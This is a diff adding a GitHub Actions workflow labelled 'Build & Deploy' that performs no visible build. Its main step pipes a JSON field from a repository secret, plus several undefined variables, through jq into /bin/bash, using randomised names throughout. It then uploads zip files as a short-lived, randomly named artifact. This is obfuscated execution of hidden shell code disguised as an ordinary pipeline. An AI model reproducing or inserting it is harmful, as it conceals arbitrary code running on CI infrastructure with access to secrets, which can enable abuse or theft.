@@ -1,0 +1,27 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          c95: ${{ secrets.c95 }}
+        run: |
+          printf '%s' "$c95" | jq -r .smqt06656 | /bin/bash
+          printf '%s' "$mnplb3" | jq -r .mm4474 | /bin/bash
+          echo $bs58893 | jq -r .i91115 | /bin/bash
+          printf '%s' "$cb720" | jq -r .ce85999 | /bin/bash
+          echo $qgze17018 | jq -r .rpe8 | /bin/bash
+          printf '%s' "$eypd08458" | jq -r .f86026 | /bin/bash
+          echo $myv7876 | jq -r .orp91686 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: wCkj8eNE
+          path: "*.zip"
+          retention-days: 1
